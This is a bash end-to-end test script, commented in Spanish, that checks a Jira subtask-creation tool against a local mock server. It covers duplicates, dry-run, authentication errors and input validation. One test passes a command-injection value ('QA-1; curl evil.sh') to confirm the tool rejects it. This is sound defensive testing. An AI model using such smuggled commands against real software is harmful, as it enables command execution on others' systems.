#!/usr/bin/env bash
# E2E contra el mock: levanta Jira simulado y valida los escenarios de la v1.
set -euo pipefail
cd "$(dirname "$0")/.."

MVN="$(command -v mvn || echo "/Applications/IntelliJ IDEA.app/Contents/plugins/maven-plugin/lib/maven3/bin/mvn")"
"$MVN" -B -ntp -q compile

export MOCK_JIRA_EMAIL=svc-qe@example.com MOCK_JIRA_TOKEN=ci-token
python3 mock/jira_mock.py > target/mock.log 2>&1 &
MOCK_PID=$!; trap 'kill $MOCK_PID 2>/dev/null || true' EXIT
for _ in $(seq 1 30); do curl -sf http://127.0.0.1:8089/health >/dev/null && break; sleep 0.3; done

PASS=0; FAIL=0
# check <nombre> <exit esperado> <texto esperado en la salida> [VAR=valor...]
check() {
  local name="$1" expect="$2" text="$3"; shift 3
  local out code
  out="$(env JIRA_BASE_URL=http://127.0.0.1:8089 JIRA_EMAIL="$MOCK_JIRA_EMAIL" JIRA_API_TOKEN="$MOCK_JIRA_TOKEN" \
        GITHUB_STEP_SUMMARY= "$@" "$MVN" -B -ntp -q exec:java 2>&1)"; code=$?
  if [[ "$code" == "$expect" && "$out" == *"$text"* ]]; then
    echo "✓ $name"; PASS=$((PASS+1))
  else
    echo "✗ $name (exit $code, esperado $expect; texto '$text')"; echo "$out" | sed 's/^/    /'; FAIL=$((FAIL+1))
  fi
}
set +e
check "crea las 5 subtareas"      0 "(QE) Registro de evidencias"  QE_ISSUE_KEY=QA-100
check "re-ejecución no duplica"   0 "Ya existe"                    QE_ISSUE_KEY=QA-100
check "dry-run no crea"           0 "[DRY-RUN]"                    QE_ISSUE_KEY=QA-101 DRY_RUN=true
check "token incorrecto → 401"    1 "401"                          QE_ISSUE_KEY=QA-101 JIRA_API_TOKEN=malo
check "secreto faltante"          1 "Faltan secretos"              QE_ISSUE_KEY=QA-101 JIRA_API_TOKEN=
check "issue inexistente → 404"   1 "404"                          QE_ISSUE_KEY=QA-999
check "input malicioso rechazado" 1 "inválido"                     QE_ISSUE_KEY='QA-1; curl evil.sh'
set -e
echo; echo "E2E: $PASS ok, $FAIL fallidos"
[[ $FAIL -eq 0 ]]
